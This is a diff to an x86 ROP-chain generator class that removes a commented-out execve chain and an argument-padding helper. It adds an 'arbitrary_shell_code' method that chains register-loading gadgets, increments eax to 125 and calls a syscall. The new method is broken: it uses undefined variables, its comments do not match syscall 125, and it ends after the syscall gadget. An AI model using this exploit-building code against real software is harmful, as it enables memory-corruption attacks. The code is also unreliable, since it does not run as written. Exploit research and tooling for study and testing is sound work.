@@ -156,6 +156,7 @@ class ROPMakerX86(object):
 
         print("p += pack('<I', 0x%08x) # %s" % (syscall["vaddr"], syscall["gadget"]))
 
+
     def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
 
         sects = self.__binary.getDataSections()
@@ -257,128 +258,6 @@ class ROPMakerX86(object):
         #adding null
 
 
-        '''
-        #--------------------------=--stack--------------------------
-
-        
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', popSrc["vaddr"]) 
-        p += b'/bin'
-        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})     
-        
-        #writes /bin on stack
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr+4) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', popSrc["vaddr"]) 
-        p += b'////'
-        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})     
-        
-        #writes //// on stack
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr+8) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', popSrc["vaddr"]) 
-        p += b'echo'
-        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})     
-        
-        #writes echo on stack
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr + 12) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', xorSrc["vaddr"]) 
-        p += self.__custompadding(xorSrc, {})
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})
-
-        #writes null byte at the end
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr + 13) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', popSrc["vaddr"]) 
-        p += b'rop '
-        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 5})  # Don't overwrite reg dst
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})
-
-        #writes "rop " on the stack 
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr + 17) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', popSrc["vaddr"]) 
-        p += b'done'
-        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 5})  # Don't overwrite reg dst
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})
-
-        #writes "done" on the stack 
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr + 21) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', xorSrc["vaddr"]) 
-        p += self.__custompadding(xorSrc, {})
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})
-
-        #writes null byte at the end
-
-        #----------------------------------args---------------------------------
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr + 60) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', popSrc["vaddr"]) 
-        p += pack('<I', dataAddr) 
-        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 60})  # Don't overwrite reg dst
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})        
-
-        #writes arg 1 on shadowstack
-
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', dataAddr + 64) 
-        p += self.__custompadding(popDst, {})
-
-        p += pack('<I', popSrc["vaddr"]) 
-        p += pack('<I', dataAddr + 13) 
-        p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 64})  
-
-        p += pack('<I', write4where["vaddr"]) 
-        p += self.__custompadding(write4where, {})        
-
-        #writes arg 2 on shadowstack
-
-        '''
         p += pack('<I', popEbx["vaddr"]) 
         p += pack('<I', dataAddr) 
         p += self.__custompadding(popEbx, {})
@@ -490,20 +369,37 @@ class ROPMakerX86(object):
 
         self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
         self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-    '''
+    
 
-    def PreProcessArgs(self, args):
-        # args [foo, bar, baz]
-        outargs = []
-        for arg in args:
-            if (len(arg) % 4 == 0):         # Does the arg actually need padding?
-                outargs.append(bytes(arg, "utf-8"))
-            else:                           # It does need padding!
-                if "/" in arg:        # Does it contain a path to pad?
-                    indexOfSlash = arg.index("/")
-                    outargs.append(bytes(arg[0:indexOfSlash] + "/"*(4 - len(arg) % 4) + arg[indexOfSlash:len(arg)], "utf-8"))
-                else:                       # Doesn't contain a path - here we pad with some stupid character
-                    outargs.append(bytes(arg, "utf-8") + b'\x07'*(4 - len(arg) % 4))       # Adds 0x07 as some padding character - (it's the bell character)
-                    break; 
+    def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
 
-        return outargs'''
+        
+
+        p += pack('<I', popEbx["vaddr"]) 
+        p += pack('<I', dataAddr) 
+        p += self.__custompadding(popEbx, {})
+
+        #puts stack in to ebx (program)
+
+        p += pack('<I', popEcx["vaddr"]) 
+        p += pack('<I', safestack) 
+        p += self.__custompadding(popEcx, {"ebx": dataAddr})  
+
+        #puts stack + 60 in to ecx (args)
+
+        p += pack('<I', popEdx["vaddr"]) 
+        p += pack('<I', stack) 
+        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  
+
+        #puts stack in to edx (env)
+
+        p += pack('<I', xorEax["vaddr"]) 
+        p += self.__custompadding(xorEax, {"ebx": dataAddr, "ecx": safestack})  
+
+        for _ in range(125):
+            p += pack('<I', incEax["vaddr"]) 
+            p += self.__custompadding(incEax, {"ebx": dataAddr, "ecx": safestack})  # Don't overwrite ebx and ecx
+
+        #sets eax to 125
+
+        p += pack('<I', syscall["vaddr"]) 
